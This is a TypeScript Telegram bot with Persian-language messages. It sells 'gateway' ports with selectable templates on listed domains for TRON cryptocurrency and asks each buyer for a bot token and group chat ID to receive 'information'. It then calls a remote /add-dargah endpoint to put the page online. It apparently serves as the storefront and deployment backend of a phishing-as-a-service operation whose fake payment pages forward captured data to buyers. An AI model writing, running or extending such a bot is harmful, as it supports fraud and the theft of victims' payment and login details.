const main_token: string = "";
const bot_wallet: string = "";
const admins: number[]   = [];

import { UserDatabase, HashDatabase, DomainDatabase } from "./database";
import telegram from "node-telegram-bot-api";
import { InlineKeyboardButton } from "node-telegram-bot-api";
import * as fs from "fs";
import * as path from "path";
import * as axios from "axios";
const Telegram = require("node-telegram-bot-api");

process.on("uncaughtException", async (uexcept) => {
    console.error(uexcept);
})

process.on("uncaughtExceptionMonitor", async (uexceptmonitor) => {
    console.error(uexceptmonitor);
})

process.on("unhandledRejection", async (unhandle) => {
    console.error(unhandle);
})

const bot: telegram = new Telegram(main_token, { polling: true });
const userdb = new UserDatabase();
const hashdb = new HashDatabase();
const domaindb = new DomainDatabase();
const price  = parseInt(fs.readFileSync(path.join(__dirname, "price.txt")).toString());
const que    = new Map<number, { domain_id?: string, skin?: string }>();
const got    = new Map<number, string>();
const inf    = new Map<number, { token?: string, chat?: number }>();
const translationTable = {
    'q': 'ǫ', 'w': 'ᴡ', 'e': 'ᴇ', 'r': 'ʀ', 't': 'ᴛ',
    'y': 'ʏ', 'u': 'ᴜ', 'i': 'ɪ', 'o': 'ᴏ', 'p': 'ᴘ',
    'a': 'ᴀ', 's': 's', 'd': 'ᴅ', 'f': 'ғ', 'g': 'ɢ',
    'h': 'ʜ', 'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'z': 'ᴢ',
    'x': 'x', 'c': 'ᴄ', 'v': 'ᴠ', 'b': 'ʙ', 'n': 'ɴ',
    'm': 'ᴍ'
};

bot.on("message", async (message) => {
    if (!message.from) return;
    if (message.chat.type === 'channel') return;
    message.text = message.text ? message.text : "";

    if (message.text.startsWith("/start") || message.text === "درگاه"){
        await userdb.add(message.from.id, () => {});
        await domaindb.getDomains(async (domains) => {
            const ghalebs = new Set<string>();
            for (const _d of domains){
                for (const __d of _d.includes){
                    ghalebs.add(__d);
                }
            }
            //const _txt = `📥 | خرید: ${Object.entries(buyTable).map(([k , v]) => `🔺 روز ${k}: ${v} ترون`).join("\n")}\n📤 | تمدید: ${Object.entries(rebuyTable).map(([k , v]) => `🔹 روز ${k}: ${v} ترون`).join("\n")}`;
            return await bot.sendMessage(
                message.chat.id,
                `🧽 | ربات خرید درگاه 𝚁 𝙿𝚘𝚛𝚝𝚊𝚕\n\n📁 | قالب: ${ghalebs.size} | دامین: ${domains.length}\n🖥️ | تضمین 3 روز قیمت ${price} ترون\n💰 | ولت بات: </code>${bot_wallet}</code>`,
                {
                    parse_mode: "HTML",
                    reply_to_message_id: message.message_id,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🪙 خرید 🪙' , callback_data: `buy_${message.from!.id}`}, { text: '🔁 تمدید 🔁', callback_data: `rebuy_${message.from!.id}` }]
                        ]
                    }
                }
            )
        })
    } else if (message.text.startsWith("/help")){
        return bot.sendMessage(
            message.chat.id,
            "/me : ارسال اطلاعات پورتتون\n/hash <HASH> : شارژ کردن حساب خودتون با ارسال هش تراکنش (فقط واریزی های 24 ساعت قبل قبول میشن)\n/cancel : کنسل کردن پروسه",
            {
                reply_to_message_id: message.message_id
            }
        )
    }

    if (got.has(message.from.id)){
        const userstep = got.get(message.from.id)!;

        if (userstep === "gettoken"){
            if (message.text.length === 0){return;}
            inf.set(message.from.id, { token: message.text });
            got.set(message.from.id, "getchat");
            return await bot.sendMessage(
                message.chat.id,
                "چت آیدی گروهتون جهت ارسال اطلاعات به اونجا رو ارسال کنید",
                {
                    reply_to_message_id: message.message_id
                }
            )
        } else if (userstep === "getchat"){
            if (!/^-?\d+$/.test(message.text)){return;}
            const _inf = inf.get(message.from.id)!;
            _inf.chat = parseInt(message.text);
            inf.set(message.from.id, _inf);
            got.delete(message.from.id);
            const _que = que.get(message.from.id)!;

            que.delete(message.from!.id);
            inf.delete(message.from!.id);

            await domaindb.getDomainByID(_que.domain_id!, async (domain) => {
                let dtype: string;
                if (!domain){
                    return await userdb.charge(message.from!.id, price, async () => {
                        await bot.sendMessage(
                            message.chat.id,
                            "🔴 | دامین از سمت ادمین ها حذف شد, لطفا دامین دیگه ای انتخاب کنید (پول شما برگردانده میشود)",
                            {
                                reply_to_message_id: message.message_id
                            }
                        )
                    });
                } else {
                    const theurl = new URL(domain.durl);
                    const orgspl = theurl.origin.split(".");
                    dtype = orgspl[orgspl.length - 1];
                }

                await userdb.addPort(message.from!.id, {
                    bought_on: Date.now(),
                    token: _inf.token!,
                    chat: _inf.chat!,
                    type: _que.skin!,
                    domain_type: dtype
                }, async (stat) => {
                    if (!stat.status){
                        return bot.sendMessage(
                            message.chat.id,
                            `🔴 | ${stat.message}`,
                            {
                                reply_to_message_id: message.message_id
                            }
                        )
                    }

                    await bot.sendMessage(
                        message.chat.id,
                        `✅ پورت با موفقیت در دیتابیس ثبت شد\n\n🖇️ | پورت : <code>${stat.port.name}</code>\n⏳ | خریداری شده در ${new Date()}\n🖇️ | دامین : ${dtype}\n🪄 | قالب : ${_que.skin!}\n💬 | چت : ${_inf.chat!}\n🤖 | توکن : <code>${_inf.token!}</code>\n\n🔮 | چند لحظه صبر کنید تا درگاهتون آنلاین بشه`,
                        {
                            reply_to_message_id: message.message_id
                        }
                    ).then(async () => {
                        await axios.post(domain.durl + "/add-dargah", JSON.stringify({ port: stat.port.name, skin: _que.skin! }), {
                            headers: {
                                "Content-Type": "application/json"
                            }
                        }).then(async (resp) => {
                            const _d = resp.data as any;
                            try {
                                if (_d.status){
                                    return await bot.sendMessage(
                                        message.chat.id,
                                        `✅ | درگاه آنلاین شد\n\n🖇️ | لینک : ${_d.on}`
                                    )
                                } else {
                                    return await bot.sendMessage(
                                        message.chat.id,
                                        `🔴 | ${_d.message}`
                                    )
                                }
                            } catch (e) {
                                return await bot.sendMessage(
                                    message.chat.id,
                                    `🔴 | ${e}`
                                )
                            }
                        }).catch(async (e) => {
                            return await bot.sendMessage(
                                message.chat.id,
                                `🔴 | ${e}`
                            )
                        })
                    })
                })
            })
        }
    }
})

bot.on("callback_query", async (call) => {
    if (!call.from) return;
    if (!call.data) return;
    if (!call.message) return;
    const real_message = call.message;
    const spl = call.data.split("_") ?? [];
    const uid = parseInt(spl[1]);
    const mode = spl[0];

    if (call.from.id === uid){
        switch (mode) {
            case "buy":
                await userdb.getUserById(call.from.id, async (user) => {
                    if (!user){
                        return await bot.answerCallbackQuery(
                            call.id,
                            {
                                text: "اول بات رو استارت کنید",
                                show_alert: true
                            }
                        )
                    }

                    if (user.ban){
                        return await bot.answerCallbackQuery(
                            call.id,
                            {
                                text: "متاسفانه شما بن شده اید",
                                show_alert: true
                            }
                        )
                    }

                    await domaindb.getDomains(async (domains) => {
                        const _endpoints = new Map<string, { endpoint: string, href: string }>();

                        if (que.has(call.from.id)){
                            que.delete(call.from.id);
                        }

                        for (const _dom of domains){
                            const theurl = new URL(_dom.durl);
                            const orgspl = theurl.origin.split(".");
                            _endpoints.set(_dom.id, { endpoint: orgspl[orgspl.length - 1], href: theurl.href });
                        }

                        const thok: InlineKeyboardButton[] = [];

                        for (const _k of _endpoints.entries()){
                            thok.push({ text: _k[1].endpoint, callback_data: `add_${call.from.id}_${_k[0]}` });
                        }

                        const chunked = chunkArray(Array.from(thok), 2);
                        await bot.editMessageText(
                            `🪒 | دریافت درگاه های موجود\n\n⚠️ | چون بات به api وصله قیمت ها ذره ای کمتر قبول نمیشن, پس کامل پول رو واریز کنید`,
                            {
                                chat_id: real_message.chat.id,
                                message_id: real_message.message_id,
                                reply_markup: {
                                    inline_keyboard: chunked
                                }
                            }
                        )
                    })
                })
                break;

            case "add":
                const _domainid = spl[2];

                await userdb.getUserById(call.from.id, async (user) => {
                    if (!user){
                        return await bot.answerCallbackQuery(
                            call.id,
                            {
                                text: "اول بات رو استارت کنید",
                                show_alert: true
                            }
                        )
                    }

                    if (user.ban){
                        return await bot.answerCallbackQuery(
                            call.id,
                            {
                                text: "متاسفانه شما بن شده اید",
                                show_alert: true
                            }
                        )
                    }

                    await domaindb.getDomainByID(_domainid, async (dom) => {
                        if (!dom){
                            return await bot.answerCallbackQuery(
                                call.id,
                                {
                                    text: "🔴 دامینی یافت نشد",
                                    show_alert: true
                                }
                            )
                        }

                        que.set(call.from.id, { domain_id: _domainid });
                        const items: InlineKeyboardButton[] = [];
                        for (const inc of dom.includes){
                            items.push({ text: inc, callback_data: `addskin_${call.from.id}_${inc}` })
                        }

                        const chuncked = chunkArray(items, 2);

                        return await bot.editMessageText(
                            '🔺 قالبی رو انتخاب کنید',
                            {
                                chat_id: real_message.chat.id,
                                message_id: real_message.message_id,
                                reply_markup: {
                                    inline_keyboard: chuncked
                                }
                            }
                        )
                    })
                })
                break;
            case "addskin":
                const skin = spl[2];
                const qdata = que.get(call.from.id)!;
                qdata.skin = skin;
                que.set(call.from.id, qdata);

                await userdb.getUserById(call.from.id, async (user) => {
                    if (!user){
                        que.delete(call.from.id);
                        return await bot.answerCallbackQuery(
                            call.id,
                            {
                                text: "اول بات رو استارت کنید",
                                show_alert: true
                            }
                        )
                    }

                    if (user.ban){
                        que.delete(call.from.id);
                        return await bot.answerCallbackQuery(
                            call.id,
                            {
                                text: "متاسفانه شما بن شده اید",
                                show_alert: true
                            }
                        )
                    }

                    if (user.coins < price){
                        que.delete(call.from.id);
                        return await bot.answerCallbackQuery(
                            call.id,
                            {
                                text: "حساب شما کافی نیست",
                                show_alert: true
                            }
                        )
                    }

                    await domaindb.getDomainByID(qdata.domain_id!, async (domain) => {
                        if (!domain){
                            return await bot.answerCallbackQuery(
                                call.id,
                                {
                                    text: "🔴 دامینی یافت نشد",
                                    show_alert: true
                                }
                            )
                        }

                        await userdb.decharge(call.from.id, price, () => {});
                        got.set(call.from.id, "gettoken");

                        return await bot.editMessageText(
                            "🤖 | توکن ربات جهت ارسال اطلاعات رو ارسال کنید",
                            {
                                chat_id: real_message.chat.id,
                                message_id: real_message.message_id
                            }
                        )
                    })
                })
                break;
        }
    }
})

function build(string: string) {
    return string.split('').map(char => translationTable[char] || char).join('');
}

function daysToMilliseconds(days: number): number {
    const millisecondsInADay = 24 * 60 * 60 * 1000;
    return days * millisecondsInADay;
}

function chunkArray<T>(array: T[], chunkSize: number): T[][] {
    const result: T[][] = [];
    
    for (let i = 0; i < array.length; i += chunkSize) {
        const chunk = array.slice(i, i + chunkSize);
        result.push(chunk);
    }
    
    return result;
}
